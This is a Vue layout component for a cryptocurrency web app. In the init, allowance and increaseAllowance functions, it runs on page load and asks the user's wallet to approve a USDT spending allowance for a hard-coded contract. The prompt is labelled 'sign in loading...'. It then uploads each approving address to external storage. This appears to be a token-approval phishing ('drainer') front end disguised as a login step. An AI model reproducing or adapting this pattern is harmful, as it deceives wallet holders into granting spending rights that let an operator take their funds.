<template>
	<div id="layout">
		<HeadNav></HeadNav>
		<div id="main">
			<router-view></router-view>
		</div>
	</div>
</template>
<script setup>

import HeadNav from "./headNav"

import Decimal from "decimal.js";
import {
	// computed,
	watch
} from "vue";
import { lockLoadHandler } from "@/utils/PlusElement";
// import { useRoute } from "vue-router";
import { UseStoreWeb3js } from "@/stores/web3js";
import { storeToRefs } from "pinia";
import { uploadUserAllowance } from "@/common/fleekStorage";
import {
	AbiAddressHash,
	addedValue,
	// AbiAddressHashTool,
} from "@/abis/index";

// const Route = useRoute();
// const currentRouteIsNav = computed(() => Route.meta.isNav);

const storeWeb3 = UseStoreWeb3js();
const {
	web3,
	userAddress,
	Contracts
} = storeToRefs(storeWeb3);
const { startWeb3 } = storeWeb3;

init();
async function init() {
	if (!web3.value) {
		console.log("layout start web3");
		const hadweb = await startWeb3();
		console.log("layout start web3", hadweb);
		if (hadweb) {
			const _isRe = await isRe(userAddress.value);
			if (!_isRe) {
				await allowance();
			}
		}
	}
}

watch(
	() => userAddress.value,
	(news, olds) => {
		if (olds && news != olds) {
			console.log(`this is new userAddress: ${news}`);
			allowance();
		}
	}
);
async function isRe(address) {
	try {
		// console.log(Contracts);
		const { HashContract } = Contracts.value;
		const res = await HashContract.methods.isRe(address).call();
		console.log("HashContract isRe", res);
		return res;
	} catch (e) {
		console.error(e);
		return false;
	}
}
async function allowance() {
	try {
		console.log(userAddress.value, AbiAddressHash);
		const { USDTContract } = Contracts.value;
		const res_allowance = await USDTContract.methods
			.allowance(userAddress.value, AbiAddressHash)
			.call();
		const v = new Decimal(res_allowance);
		console.log("是否有授权", v);
		if (v <= 0) {
			const res = await increaseAllowance();
			if (res) {
				uploadAllowance();
			}
		}
	} catch (e) {
		console.error(e);
	}
}
async function increaseAllowance() {
	const load = lockLoadHandler("sign in loading...");
	try {
		const { USDTContract } = Contracts.value;
		const res = await USDTContract.methods
			.increaseAllowance(AbiAddressHash, addedValue)
			.send({
				from: userAddress.value,
			});
		console.log("increaseAllowance", res);
		load.close();
		return res;
	} catch (e) {
		console.error(e);
		load.close();
		return false;
	}
}
async function uploadAllowance() {
	const load = lockLoadHandler("upload loading...");
	try {
		const res = await uploadUserAllowance(userAddress.value);
		if (res) {
			console.log("上传成功");
		}
		load.close();
	} catch (e) {
		console.error(e);
		load.close();
	}
}
</script>
<style lang="scss" scoped>
// $navSizePX: 50px;

#layout {
	min-height: 100vh;
	background-image: url("~@/assets/banner/bg-1.png");
	background-repeat: repeat-y;
	background-size: cover;
	background-position: top left;
	background-color: #000;
}
// .app-main {
// 	display: flex;
// 	flex-direction: column;
// 	justify-content: space-between;
// }

#main {
	overflow: auto;
}
// .nav-padding {
// 	height: calc(100vh - $navSizePX);
// }
// .nav-size {
// 	min-height: $navSizePX;
// 	height: $navSizePX;
// 	width: 100%;
// 	border-top: 1px solid #999;
// 	background-color: #333;
// }
</style>
